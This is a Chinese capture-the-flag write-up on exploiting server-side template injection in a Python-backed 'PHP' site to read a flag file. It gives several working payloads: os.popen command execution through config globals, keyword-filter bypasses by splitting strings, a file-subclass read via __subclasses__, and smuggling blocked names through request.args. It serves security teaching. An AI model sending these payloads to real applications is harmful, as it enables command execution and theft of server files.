ailx10说：这篇是我2024年12月写的。Confusion1 先让我用一个算术表达式确认：输入不是原样显示，而是真的进了模板求值。接下来题目开始过滤词，我就试着拼字符串、换取对象的方式，又把部分内容放到 request.args 里绕开局部检查。这篇记录的是几种路线怎样从同一个判断点分出去，而不是只放最后一句表达式。尤其旧 Python 里的对象顺序和 file 子类，离开题目环境就可能变；所以我更想留下当时怎么找对象、怎么确认求值，而不把一个固定下标当成永远可用的答案。

---

本题观察模板表达式的执行及过滤范围。仅阻拦某些关键词并不能可靠阻止未经信任的输入进入模板求值。

> 某天，Bob说：PHP是最好的语言，但是Alice不赞同。所以Alice编写了这个网站证明。在她还没有写完的时候，我发现其存在问题。(请不要使用扫描器)

![](/notes-assets/f5247ee3cfe779747c77.webp)

画面是蟒蛇缠住大象，你敢相信这是暗指 python \+ php 吗？点击注册，页面有隐藏 flag 的提示信息 `Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt`

![](/notes-assets/63d531dd1a5c5282223e.webp)

访问 `GET /register.php/{{2*2}} HTTP/1.1` 发现存在python 模版注入

![](/notes-assets/9b3e8513e98f85503007.webp)

解法1：尝试模版注入，读取 flag 发现被拦截了，到 `config.__class__` 就被拦截了

```
GET /register.php/{{config.__class__.__init__.__globals__["os"].popen("cat%/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt").read()}} HTTP/1.1
```

![](/notes-assets/435e51daedf31b92aaad.webp)

原文通过字符串拼接尝试绕开局部过滤；请求中存在百分号转写疑点，需要在原环境确认实际编码。

```
GET /register.php/{{config["__c""lass__"]["__in""it__"]["__global""s__"]["os"]["po""pen"]("c""at%20/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt")["re""ad"]()}} HTTP/1.1
```

![](/notes-assets/3fe6bd85a0d4883591ce.webp)

原文尝试使用旧 Python 的 file 类。类继承链和子类索引受解释器版本及加载状态影响，不能固定套用示例下标。

```
GET /register.php/{{''["__clas""s__"]["__m""ro__"][2]["__subcl""asses__"]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')["re""ad"]()}} HTTP/1.1
```

![](/notes-assets/cb796d4f9d85d182398c.webp)

原文进一步从 request.args 获取片段，说明过滤只检查部分输入位置时可能遗漏其他参数。示例同样依赖具体对象结构。

```
GET /register.php/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read HTTP/1.1
```

![](/notes-assets/67210bbaf0ca4c3cd757.webp)

每种写法都带着当时的Python和模板环境。把过滤位置、对象路径和实际输出接起来，题解就不只是几种替代拼法，而是一条能继续推导的执行路线。
